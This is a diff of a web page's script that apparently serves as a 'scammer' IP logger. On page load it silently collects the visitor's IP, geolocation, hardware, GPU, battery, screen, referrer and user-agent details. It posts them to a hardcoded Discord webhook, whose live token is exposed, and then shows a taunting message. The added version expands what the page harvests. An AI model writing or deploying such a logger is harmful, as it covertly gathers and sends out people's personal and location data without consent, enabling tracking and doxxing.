@@ -13,52 +13,58 @@
     <div id="status">Fetching...</div>
 
     <script>
-        async function collectAll() {
-            const statusDiv = document.getElementById('status');
-            const webhook = 'https://discord.com/api/webhooks/1496580919803252799/mtZ0WbdZnkxOOB0eMVyJx_xJ18EPEGWs9Gzdw2OCeRcFfICBpsIg09_rctz4pOYkBl0S';
-            
-            let ipData = {};
+        async function getIP() {
             try {
-                const response = await fetch('https://ipapi.co/json/');
-                ipData = await response.json();
-            } catch (e) { ipData = { ip: "Error", city: "Error", region: "Error", org: "Error" }; }
-
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const geo = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude} (High Accuracy)`;
-                await sendToDiscord(webhook, ipData, geo);
-            }, async (err) => {
-                const geo = `Denied/Not Supported (Using IP City: ${ipData.city})`;
-                await sendToDiscord(webhook, ipData, geo);
-            }, { enableHighAccuracy: true, timeout: 5000 });
-
-            statusDiv.innerHTML = `GET FUCKED SCAMMER LMFAO, ALL YOUR INFORMATION HAVE BEEN SENT TO ME`;
-        }
-
-        async function sendToDiscord(webhook, ipData, geo) {
-            const data = {
-                username: "ULTIMATE LOGGER",
-                embeds: [{
-                    title: "🚨 CRITICAL TARGET DATA 🚨",
-                    color: 16711680,
-                    fields: [
-                        { name: "📍 Precise Location", value: `**GPS:** ${geo}\n**IP City:** ${ipData.city}\n**Region:** ${ipData.region}\n**ISP:** ${ipData.org}`, inline: false },
-                        { name: "🌐 Network", value: `**IP:** ${ipData.ip}\n**TZ:** ${ipData.timezone}`, inline: true },
-                        { name: "💻 Hardware", value: `**OS:** ${navigator.platform}\n**Cores:** ${navigator.hardwareConcurrency}\n**RAM:** ${navigator.deviceMemory}GB`, inline: true },
-                        { name: "🖥️ GPU", value: getGPU(), inline: false },
-                        { name: "🕵️ User Agent", value: `\`\`\`${navigator.userAgent}\`\`\`` }
-                    ],
-                    timestamp: new Date().toISOString()
-                }]
-            };
-            await fetch(webhook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (e) { return "Failed to fetch"; }
         }
 
         function getGPU() {
             const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            if (!gl) return "N/A";
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (!gl) return "Not Supported";
             const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown";
+            return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Vendor Unknown";
+        }
+
+        async function collectAll() {
+            const statusDiv = document.getElementById('status');
+            const webhook = 'https://discord.com/api/webhooks/1496580919803252799/mtZ0WbdZnkxOOB0eMVyJx_xJ18EPEGWs9Gzdw2OCeRcFfICBpsIg09_rctz4pOYkBl0S';
+            
+            const ip = await getIP();
+            let batteryLevel = "N/A";
+            try {
+                const b = await navigator.getBattery();
+                batteryLevel = `${(b.level * 100)}% (${b.charging ? 'Plugged In' : 'On Battery'})`;
+            } catch (e) {}
+
+            const data = {
+                content: "🚨 **MAXIMUM DATA LEAKED** 🚨",
+                embeds: [{
+                    color: 0,
+                    fields: [
+                        { name: "📍 Network & Loc", value: `**IP:** ${ip}\n**TZ:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n**Lang:** ${navigator.language}`, inline: true },
+                        { name: "💻 Device Info", value: `**OS:** ${navigator.platform}\n**CPU Cores:** ${navigator.hardwareConcurrency}\n**RAM:** ${navigator.deviceMemory}GB`, inline: true },
+                        { name: "🔋 Battery", value: batteryLevel, inline: true },
+                        { name: "🖥️ GPU/Video", value: `**GPU:** ${getGPU()}\n**Resolution:** ${screen.width}x${screen.height}\n**Depth:** ${screen.colorDepth}-bit`, inline: false },
+                        { name: "🛠️ Capabilities", value: `**Touch Points:** ${navigator.maxTouchPoints}\n**Cookies:** ${navigator.cookieEnabled}\n**PDF Viewer:** ${navigator.pdfViewerEnabled}`, inline: true },
+                        { name: "📏 Window Stats", value: `**Inner:** ${window.innerWidth}x${window.innerHeight}\n**Outer:** ${window.outerWidth}x${window.outerHeight}`, inline: true },
+                        { name: "🔗 Referrer", value: document.referrer || "Direct Visit", inline: false },
+                        { name: "🕵️ Browser Header", value: `\`\`\`${navigator.userAgent}\`\`\`` }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            await fetch(webhook, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+
+            statusDiv.innerHTML = `GET FUCKED SCAMMER LMFAO, ALL YOUR INFORMATION HAVE BEEN SENT TO ME`;
         }
 
         window.onload = collectAll;
